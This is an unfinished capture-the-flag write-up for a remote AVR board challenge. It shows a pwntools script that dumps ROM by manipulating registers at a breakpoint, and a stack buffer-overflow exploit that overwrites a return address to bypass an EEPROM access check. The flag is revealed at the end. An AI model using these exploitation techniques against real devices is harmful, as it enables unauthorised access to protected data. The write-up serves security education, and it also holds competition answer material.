# Registers Matter

**Problem Description:** 

> We have an unknown remotely accessible board that hides the flag. Try to debug it to steal the flag!<br>
>
> [Attachment](./b2d1d45d27663c518517cd5740b619fbe6f64056a41574196303dd21c5df9834f014089f139585e7cda0a1f15bd0ce74db5d34f817642e017aa8be90bcc3d137)<br>
>
> `registers.2020.ctfcompetition.com 1337`

## Solution

The zipped attachment contained a single file, [debugger.py](./debugger.py), which seemed to be a wrapper to communicate with the remote. With no source code to inspect nor binary to disassemble/decompile/debug locally, I had no choice but to run `debugger.py`:

```bash
$ python3 debugger.py registers.2020.ctfcompetition.com
debugger.py:413: DeprecationWarning: "@coroutine" decorator is deprecated since Python 3.8, use "async def" instead
  def main_task(loop):
Please choose mode of operation:
 D - debug session
 C - challenge mode
Choice: D
DBG> help
Available commands:
  step [COUNT]
  input STR
  cont
  trace
  pause SECS
  reg [<RN> <VALUE>] ... [<RN> <VALUE>]
  break [delete|toggle N] | [ADDR]
  write RAW-COMMAND
  quit|exit
```

Sadly, there didn't seem to be any commands to print a value from memory, or disassemble the program that was being debugged... So, still with no clue  on what we are debugging, I hit `cont`inue:

```
DBG> cont
Menu:
1. Read from EEPROM
2. Magic function
0. Exit
Choice (do not enter more than 5 chars): 
```

## TODO

Add some meaningful words to brief about the functions of the debugger, how the ROM was AVR, and detail some of the insights and time wastes from static analysis with snippets of AVR disassembly and pictures?

Expand on the following sections and use meaningful words in meaningful ways to convey meaningful thoughts that others can comprehend?

### Finding a way to dump the ROM

Shortly after spamming single step and observing registers after each instruction, we arrive at the following pattern of instructions:

```
DBG> 
 pc = 000102  gp0 = 00   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 21FF    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 00  gp13 = 00  gp14 = 00  gp15 = 00
flg = 00     gp16 = 00  gp17 = 04  gp18 = 00  gp19 = 00  gp20 = 00  gp21 = 00  gp22 = 00  gp23 = 00
000000000010 gp24 = 00  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = FF  gp29 = 21  gp30 = 9A  gp31 = 0D  gp32 = 000000

DBG> 
 pc = 000108  gp0 = 00   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 21FF    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 00  gp13 = 00  gp14 = 00  gp15 = 00
flg = 00     gp16 = 00  gp17 = 04  gp18 = 00  gp19 = 00  gp20 = 00  gp21 = 00  gp22 = 00  gp23 = 00
000000000011 gp24 = 00  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = FF  gp29 = 21  gp30 = 9A  gp31 = 0D  gp32 = 000000

DBG> 
 pc = 00010A  gp0 = 00   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 21FF    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 00  gp13 = 00  gp14 = 00  gp15 = 00
flg = 35     gp16 = 00  gp17 = 04  gp18 = 00  gp19 = 00  gp20 = 00  gp21 = 00  gp22 = 00  gp23 = 00
000000000012 gp24 = 00  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = FF  gp29 = 21  gp30 = 9A  gp31 = 0D  gp32 = 000000

DBG> 
 pc = 00010C  gp0 = 00   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 21FF    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 00  gp13 = 00  gp14 = 00  gp15 = 00
flg = 35     gp16 = 00  gp17 = 04  gp18 = 00  gp19 = 00  gp20 = 00  gp21 = 00  gp22 = 00  gp23 = 00
000000000013 gp24 = 00  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = FF  gp29 = 21  gp30 = 9A  gp31 = 0D  gp32 = 000000

DBG> 
 pc = 000104  gp0 = 00   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 21FF    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 00  gp13 = 00  gp14 = 00  gp15 = 00
flg = 35     gp16 = 00  gp17 = 04  gp18 = 00  gp19 = 00  gp20 = 00  gp21 = 00  gp22 = 00  gp23 = 00
000000000014 gp24 = 00  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = FF  gp29 = 21  gp30 = 9A  gp31 = 0D  gp32 = 000000

DBG> 
 pc = 000106  gp0 = 00   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 21FF    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 00  gp13 = 00  gp14 = 00  gp15 = 00
flg = 35     gp16 = 00  gp17 = 04  gp18 = 00  gp19 = 00  gp20 = 00  gp21 = 00  gp22 = 00  gp23 = 00
000000000015 gp24 = 00  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = FF  gp29 = 21  gp30 = 9B  gp31 = 0D  gp32 = 000000

<blah blah blah ...>

DBG> 
 pc = 000104  gp0 = 64   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 21FF    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 00  gp13 = 00  gp14 = 00  gp15 = 00
flg = 35     gp16 = 00  gp17 = 04  gp18 = 00  gp19 = 00  gp20 = 00  gp21 = 00  gp22 = 00  gp23 = 00
00000000009B gp24 = 00  gp25 = 00  gp26 = 1B  gp27 = 02  gp28 = FF  gp29 = 21  gp30 = B5  gp31 = 0D  gp32 = 000000

DBG> 
 pc = 000106  gp0 = 2C   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 21FF    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 00  gp13 = 00  gp14 = 00  gp15 = 00
flg = 35     gp16 = 00  gp17 = 04  gp18 = 00  gp19 = 00  gp20 = 00  gp21 = 00  gp22 = 00  gp23 = 00
00000000009C gp24 = 00  gp25 = 00  gp26 = 1B  gp27 = 02  gp28 = FF  gp29 = 21  gp30 = B6  gp31 = 0D  gp32 = 000000

DBG> 
 pc = 000108  gp0 = 2C   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 21FF    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 00  gp13 = 00  gp14 = 00  gp15 = 00
flg = 35     gp16 = 00  gp17 = 04  gp18 = 00  gp19 = 00  gp20 = 00  gp21 = 00  gp22 = 00  gp23 = 00
00000000009D gp24 = 00  gp25 = 00  gp26 = 1C  gp27 = 02  gp28 = FF  gp29 = 21  gp30 = B6  gp31 = 0D  gp32 = 000000

DBG> 
 pc = 00010A  gp0 = 2C   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 21FF    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 00  gp13 = 00  gp14 = 00  gp15 = 00
flg = 15     gp16 = 00  gp17 = 04  gp18 = 00  gp19 = 00  gp20 = 00  gp21 = 00  gp22 = 00  gp23 = 00
00000000009E gp24 = 00  gp25 = 00  gp26 = 1C  gp27 = 02  gp28 = FF  gp29 = 21  gp30 = B6  gp31 = 0D  gp32 = 000000

DBG> 
 pc = 00010C  gp0 = 2C   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 21FF    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 00  gp13 = 00  gp14 = 00  gp15 = 00
flg = 35     gp16 = 00  gp17 = 04  gp18 = 00  gp19 = 00  gp20 = 00  gp21 = 00  gp22 = 00  gp23 = 00
00000000009F gp24 = 00  gp25 = 00  gp26 = 1C  gp27 = 02  gp28 = FF  gp29 = 21  gp30 = B6  gp31 = 0D  gp32 = 000000

DBG> 
 pc = 000104  gp0 = 2C   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 21FF    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 00  gp13 = 00  gp14 = 00  gp15 = 00
flg = 35     gp16 = 00  gp17 = 04  gp18 = 00  gp19 = 00  gp20 = 00  gp21 = 00  gp22 = 00  gp23 = 00
0000000000A0 gp24 = 00  gp25 = 00  gp26 = 1C  gp27 = 02  gp28 = FF  gp29 = 21  gp30 = B6  gp31 = 0D  gp32 = 000000

DBG> 
 pc = 000106  gp0 = 20   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 21FF    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 00  gp13 = 00  gp14 = 00  gp15 = 00
flg = 35     gp16 = 00  gp17 = 04  gp18 = 00  gp19 = 00  gp20 = 00  gp21 = 00  gp22 = 00  gp23 = 00
0000000000A1 gp24 = 00  gp25 = 00  gp26 = 1C  gp27 = 02  gp28 = FF  gp29 = 21  gp30 = B7  gp31 = 0D  gp32 = 000000
<...>
```

Based on the recurring pattern of the `pc`, it was obvious we were in a loop. Furthermore:

- `gp26` increases by one after stepping through `pc=0x106`
- `gp0` usually changes values after stepping through `pc=0x104`
- `gp30` also increases by one, but after stepping through `pc=0x104`

Since `gp26` starts at 0 and counts its way up, it was obvious that `gp26` is the loop counter or a part of it. Similarly, since `gp30` also increases by one each time, it is probably holding an address to read/write from. However, the stack pointer (`sp`) is 2 bytes, so if `gp30` is part of an address, it is probably the low byte. Setting a breakpoint at `pc=0x104` and playing around with `gp30-31` confirmed that they indeed hold an address from which a byte is read onto `gp0`. Thus, the following script was made to dump the ROM:

```python
from pwn import *

DEBUGGER_ARGS = ["./debugger.py", "registers.2020.ctfcompetition.com", "1337"]

def send_dbg_cmd(dbg_io, cmd):
    dbg_io.sendlineafter("DBG> ", cmd)

def dump_rom(dump_file):
    io = process(DEBUGGER_ARGS)
    io.sendlineafter("Choice: ", "D")
    send_dbg_cmd(io, "break 0x104")
    send_dbg_cmd(io, "cont")
    for i in range(0, 0x1000):
        print(".", end="")
        lo, hi = i & 0xFF, i >> 8
        send_dbg_cmd(io, f"reg 26 0 30 {lo} 31 {hi}")
        send_dbg_cmd(io, "cont")
        io.recvuntil("gp0 = ")
        dump_file.write(bytes([int(io.recvuntil(" "), 16)]))
    io.close()

if __name__ == "__main__":
    with open("rom.dump", "wb") as f:
        dump_rom(f)
```

### Can't Read EEPROM Sections 0-15

**Write some meaningful and comprehensible set of words here...**

```
Menu:
1. Read from EEPROM
2. Magic function
0. Exit
Choice (do not enter more than 5 chars): 1
Enter start sector (16-31, 0 to exit): 1
### DENIED: access to software-protected area!
```

### Where Is the Flag???

**Write some words here...**

```
$ python3 debugger.py registers.2020.ctfcompetition.com
Please choose mode of operation:
 D - debug session
 C - challenge mode
Choice: D
DBG> break 0x45c
DBG> cont
Menu:
1. Read from EEPROM
2. Magic function
0. Exit
Choice (do not enter more than 5 chars): 1
Enter start sector (16-31, 0 to exit): 16

 pc = 00045C  gp0 = 02   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 1DDF    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 44  gp13 = 03  gp14 = CF  gp15 = 02
flg = A2     gp16 = FA  gp17 = 1D  gp18 = DA  gp19 = 00  gp20 = 00  gp21 = 02  gp22 = 00  gp23 = 0A
00000002C883 gp24 = 00  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = 10  gp29 = 00  gp30 = D6  gp31 = 1D  gp32 = 021DEA

Breakpoint hit #1
Cycles passed: 182403
DBG> reg 28 0
DBG> cont
Enter number of sectors to read (1-16): 16
=== EEPROM dump (0x00 - 0x800) ===
0000: 43 54 46 7B 44 45 42 55  47 5F 4D 4F 44 45 2C 4E  |  CTF{DEBUG_MODE,N
0010: 4F 54 20 41 20 46 4C 41  47 7D 00 00 00 00 00 00  |  OT A FLAG}......
<snipped cause they are just 0s>
07F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
```

### Getting The Flag For Real

- Breadsticks noticed the `(do not enter more than 5 chars)` and quickly thought to look for a buffer overflow
- We searched for a bit, until he further realized this was ultra trivial thanks to the number reading function (0xfd in Ghidra)
- It reads up to some hundreds of chars onto a stack buffer of size 8, and then calls `atoi` or something similar on the buffer and stores the result on `reg Y (gp28-29)`
- So, if we began our input with numbers we wanted, we can control `reg W (gp24-25)`
- We can also control:
  - The return address, as it is stored on the stack and easily reachable thanks to the generous read amount
  - `reg Y (gp28-29)`, as the function pops values from the stack onto `reg Y (gp28-29)` shortly before returning (0x115-0x116 in Ghidra)

Thus the following exploit was crafted **(talk about how `termios` stuff from `debugger.py` had to be commented out)**:

```python
io = process(DEBUGGER_ARGS)
io.sendlineafter("Choice: ", "C")
# ascii "1" so W becomes 1 after the atoi thing
# spam null bytes onto stack so Y becomes 0 after pop
# overwrite return address to 0x233 (past start sector check
# and right after the call to 0xfd for num sectors to read)
io.sendlineafter("): ", "1"+"\x00"*7+"\x00\x02\x33")
io.interactive()
```

Running the script, we get:

```bash
$ python3 solve.py
[+] Starting local process './debugger.py': pid 244
[*] Switching to interactive mode
=== EEPROM dump (0x00 - 0x80) ===
0000: 43 54 46 7B 72 33 36 31  35 37 33 72 35 39 30 37  |  CTF{r361573r5907
0010: 33 37 37 33 72 7D 00 00  00 00 00 00 00 00 00 00  |  3773r}..........
0020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
```

